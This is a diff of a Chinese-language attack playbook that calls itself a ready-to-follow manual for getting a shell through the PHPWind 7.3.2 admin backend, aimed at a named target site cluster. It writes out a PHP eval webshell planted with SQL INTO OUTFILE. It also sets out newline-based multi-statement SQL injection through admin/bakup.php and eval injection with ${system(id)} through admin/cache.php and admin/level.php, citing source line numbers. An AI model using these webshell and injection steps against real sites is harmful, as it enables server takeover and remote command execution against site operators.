@@ -15,7 +15,7 @@
 
 ## 描述
 
-把知识库中同圈子 PHPWind 7.3.2（example.com / 203.0.113.126 / tgt4382）的实测结论逐条对齐整理成可直接照做的后台 getshell 优先级手册，含权限自检判据、源码行号、响应字节数速查与源码级判死清单
+把知识库中同圈子 PHPWind 7.3.2（example.com / 203.0.113.126 / 白小姐站群）的实测结论逐条对齐整理成可直接照做的后台 getshell 优先级手册，含权限自检判据、源码行号、响应字节数速查与源码级判死清单
 
 ## 用法
 
@@ -48,9 +48,9 @@ SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/www/wwwroot/<站目录>/x.php'
 
 ## 2. P1 — admin/bakup.php 任意 SQL（源码级确证，7.3.2/7.5SP3 同结构）
 ```php
-// admin/target276.example.com:174-183  $table 来自 $_POST['tabledb']，裸拼接无过滤
+// admin/bakup.php:174-183  $table 来自 $_POST['tabledb']，裸拼接无过滤
 $creattable .= "DROP TABLE IF EXISTS $table;\n";   // ★ 元素含 \n 即插入独立 SQL 行
-// admin/target276.example.com:185-216  行尾是 ; 就 query 一次 → 天然多语句
+// admin/bakup.php:185-216  行尾是 ; 就 query 一次 → 天然多语句
 if (eregi(";$", $value)) { $query .= $value; $db->query($query); }
 ```
 两步利用：
@@ -63,16 +63,16 @@ if (eregi(";$", $value)) { $query .= $value; $db->query($query); }
 
 ## 3. P2 — admin/cache.php 风格 CSS eval
 ```php
-// admin/target117.example.com:682-686 / 704-708
+// admin/cache.php:682-686 / 704-708
 $style_css = addslashes(str_replace(array('<style type="text/css">','</style>'),'',$style_css[1]));
 eval("\$style_css = \"$style_css\";");
 ```
 `addslashes` 只处理 `"` `'` `\` NUL，**`$ { }` 全放行** → `${system(id)}` 可用。
-**写入侧防守**：`admin/target188.example.com:154` 把 `$`→`\$`，正常后台写入路径插值失效 ⇒ 需找其它能把 `${...}` 原样写进 `data/style/{tplpath}_css.htm` 的点。触发：`example.com?adminjob=cache`（更新缓存）。
+**写入侧防守**：`admin/setstyles.php:154` 把 `$`→`\$`，正常后台写入路径插值失效 ⇒ 需找其它能把 `${...}` 原样写进 `data/style/{tplpath}_css.htm` 的点。触发：`example.com?adminjob=cache`（更新缓存）。
 
 ## 4. P3 — admin/level.php HTML eval
 ```php
-// admin/target120.example.com:596
+// admin/level.php:596
 eval("\$html = \"" . addcslashes($html, '"') . "\";");   // 只转义 " ，$ 与 {} 放行
 ```
 需定位 `$html` 的后台输入字段（用户组/等级自定义 HTML 或权限描述）。
